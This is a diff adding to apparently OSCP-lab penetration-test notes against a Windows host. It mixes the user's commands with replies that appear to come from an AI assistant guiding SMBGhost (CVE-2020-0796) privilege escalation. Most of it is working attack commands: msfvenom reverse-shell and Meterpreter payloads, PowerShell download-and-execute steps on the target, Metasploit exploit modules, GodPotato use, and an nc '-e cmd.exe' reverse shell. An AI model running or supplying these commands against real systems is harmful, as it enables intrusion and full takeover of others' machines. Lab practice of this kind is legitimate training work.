@@ -193,3 +193,137 @@ C:\Users\nathan\Nexus\nexus-3.21.0-05>whoami
 whoami
 billyboss\nathan
 ```
+
+
+=====
+
+● First, confirm the patch status from your shell:  
+  
+```
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+
+OS Name:                   Microsoft Windows 10 Pro
+OS Version:                10.0.18362 N/A Build 18362
+ 
+```
+
+```
+wmic qfe list | findstr "4551762"
+<empty>
+```
+                                                                                               
+ If KB4551762 is absent, you're good to proceed. Now for the exploit:                                                         
+                                                                                                                              
+ 1. Get the SMBGhost LPE exploit (danigargu's PoC is the standard one for OSCP):                                              
+                                                                                                                            
+ # On Kali - grab a precompiled binary or compile it                                                                          
+ # Search exploit-db or searchsploit                                                                                          
+ searchsploit SMBGhost                                                                                                        
+                                                                                                                              
+ 2. The exploit needs shellcode injected — generate it:                                                                       
+                                                                                                                            
+ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.51 LPORT=5555 -f python -v shellcode                              
+                                                                                                                              
+ 3. Embed the shellcode into the exploit source, compile, and transfer:                                                       
+                                                                                                                              
+ # Host it                                                                                                                    
+ python3 -m http.server 80                                                                                                  
+                                                                                                                              
+ # On target shell  
+ powershell -c "Invoke-WebRequest -Uri http://192.168.49.51/exploit.exe -OutFile C:\Windows\Temp\e.exe"                       
+ C:\Windows\Temp\e.exe                                                                                                        
+    
+ 4. Catch the SYSTEM shell on a second listener:                                                                              
+                                                                                                                            
+ nc -lvnp 5555                                                                                                                
+                                                                                                                            
+ First step — run the systeminfo / wmic qfe check and paste the output so we can confirm the patch is missing before          
+ proceeding.
+
+
+```bash
+
+# let's use GodPotato.exe.
+
+
+# listen for connection on attacker...
+nc -lvnp 5555
+
+wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
+cp GodPotato-NET4.exe GodPotato.exe
+file GodPotato.exe
+
+wget https://github.com/itm4n/FullPowers/releases/download/v0.1/FullPowers.exe
+file FullPowers.exe
+
+cp /usr/share/windows-binaries/nc.exe ./nc.exe
+file nc.exe
+
+# serve files.
+python3 -m http.server 80
+
+# run this on victim to download nc and godpotato
+powershell -c "Invoke-WebRequest -Uri http://192.168.49.51/GodPotato.exe -OutFile ./GodPotato.exe"
+powershell -c "Invoke-WebRequest -Uri http://192.168.49.51/nc.exe -OutFile ./nc.exe"
+powershell -c "Invoke-WebRequest -Uri http://192.168.49.51/FullPowers.exe -OutFile ./FullPowers.exe"
+
+
+FullPowers.exe
+GodPotato.exe -cmd "C:\Windows\Temp\nc.exe 192.168.49.53 5555 -e cmd.exe"
+
+```
+
+okay. so godpotato doesn't work.
+
+```
+
+msfconsole
+use exploit/local/cve_2020_0796_smbghost
+set SESSION <your_session>                                        
+set LHOST 192.168.49.51                                         
+run
+
+
+```
+
+
+● You need to get a Meterpreter session first, then reference it. Here's the full flow:                                        
+                                                                                                                            
+ 1. Set up the handler in msfconsole:                                                                                         
+ 
+use multi/handler                                                                                                            
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.49.51                                                                                                    
+set LPORT 6666                                                                                                               
+run              
+                                                                                                                              
+ 2. On Kali (separate terminal), generate and serve the payload:                                                            
+ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.51 LPORT=6666 -f exe -o meter.exe                           
+ python3 -m http.server 80                                                                            
+                                                                                                                              
+ 3. On your existing shell, download and run it:                                                                            
+ powershell -c "Invoke-WebRequest -Uri http://192.168.49.51/meter.exe -OutFile C:\Windows\Temp\m.exe"                         
+ C:\Windows\Temp\m.exe                                                                                                      
+                                                                                                                              
+ 4. Once the Meterpreter session connects, background it:                                                                     
+ background                                                                                                                   
+ # note the session number (e.g. 1)                                                                                           
+                                                                                                                            
+ 5. Then load the SMBGhost module:                                                                                            
+ use exploit/local/cve_2020_0796_smbghost                                                                                     
+ set SESSION 1                                                                                                                
+ set LHOST 192.168.49.51                                                                                                      
+ set LPORT 7777                                                                                                             
+ run              
+                                                                                                                              
+ You should get a SYSTEM Meterpreter back.
+
+
+--------
+
+nope. dang it.
+
+let's try compiling this ourselves.
+
+https://github.com/danigargu/CVE-2020-0796
+
